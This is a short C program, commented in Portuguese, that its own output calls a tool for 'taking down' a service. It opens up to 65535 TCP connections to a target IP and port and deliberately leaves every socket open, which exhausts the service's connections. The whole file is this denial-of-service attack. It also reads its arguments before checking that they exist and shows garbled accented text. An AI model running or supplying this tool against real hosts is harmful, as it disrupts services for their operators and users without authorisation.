#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){

	int meusocket;
	int conecta;

	int range;
	int inicio = 0;
	int final = 65535;
	char * destino;
	destino = argv[1];
	int porta;
	porta = atoi(argv[2]);

	struct sockaddr_in alvo;

	if(argc < 2){
        printf("Modo de uso: %s 192.168.15.3 80\n",argv[0] );
        return 0;
} else {
	for(range=inicio;range<final;range++){

	meusocket = socket(AF_INET,SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);
	alvo.sin_addr.s_addr = inet_addr(destino);

	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0){
		printf("Derrubando ServiÃ§o de %s na porta %d contagem de conexoes: %d \n",destino,porta,range);
	}/*else{
                close(meusocket);
                close(conecta);
        }*/
      }
   }
}
